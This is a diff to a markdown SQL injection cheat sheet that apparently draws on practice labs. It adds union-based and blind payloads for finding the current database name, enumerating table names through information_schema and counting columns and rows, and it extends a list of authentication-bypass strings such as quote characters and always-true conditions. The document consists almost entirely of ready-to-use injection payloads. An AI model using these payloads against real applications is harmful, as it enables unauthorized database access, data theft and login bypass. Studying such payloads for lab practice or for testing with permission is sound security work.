@@ -150,7 +150,13 @@ This type of SQLi triggers an out-of-band network connection to a system control
 
 **Find Current Database Name:**  
 ```sql  
-SELECT SUBSTRING((SELECT DATABASE()),1,1);  
+SELECT SUBSTRING((SELECT DATABASE()),1,1);
+a' union select null,null,null where database() like 'sqli_three%';#
+```
+**Verify current database:***
+```sql
+select database()='avengers';#
+a' union select null,null,null where database() = 'sqli_three';#
 ```
 **Find length of current db:**  
 ```sql  
@@ -163,16 +169,32 @@ SELECT SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 1 OF
 **Find Table Names:**  
 ```sql 
 SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 10),1,1);
+admin' and (select length(table_name) from information_schema.tables where table_schema = 'sqlithree' limit 1) = 1;#
 select substring(table_name,1,1) from information_schema.tables limit 1 offset 10;
-0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one' 
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+a' union select null,null,null from information_schema.tables where table_schema='sqli_three' and table_name like 'users%' limit 1;#
+```
+**Verify Table Names:**
+```sql
+a' union select null,null,null from information_schema.tables where table_schema='sqli_three' and table_name = 'users' limit 1;#
 ```
 **Find number of tables present in current db:**  
-```
+```sql
 SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE();
 ```
-**Find length of each table:**  
+**Count number of entries in a column**
+```sql
+select count(column_name) from information_schema.columns where table_schema='avengers' and table_name='users';
+select count(username) from users;
 ```
+**Find length of each table:**  
+```sql
 SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT {i},1;
+```
+**Find Table Names:**
+```sql
+admin' and (select length(table_name) from information_schema.tables where table_schema = 'sqlithree' limit 1) = 1;#
+a' union select null,null,null from information_schema.tables where table_schema='sqli_three' and table_name like 'users%' limit 1;#
 ```
 **Find Column Names:**  
 ```sql 
@@ -191,7 +213,11 @@ These payloads combine multiple SQLi techniques like authentication bypass, time
 
 **Simple Authentication Bypass:**  
 ```sql
-'  
+'
+"
+' and 1=1#
+" and 4=4;#
+' and 2=2;--
 ' or 1=1--  
 ' or 1=2--  
 ```
